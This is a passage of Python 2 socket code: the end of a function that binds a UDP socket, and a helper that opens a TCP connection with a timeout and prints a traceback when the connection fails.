    sd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sd.settimeout(TIMEOUT)
    sd.bind(("", port))
    return sd

def getconnect(address):
    try:
        sd = socket.create_connection(address, timeout = TIMEOUT)
        print "connected" , address
        return sd
    except:
        print "create_connection failed...", address
        print "default timeout: ", TIMEOUT
        traceback.print_exc()
        return 0 
```
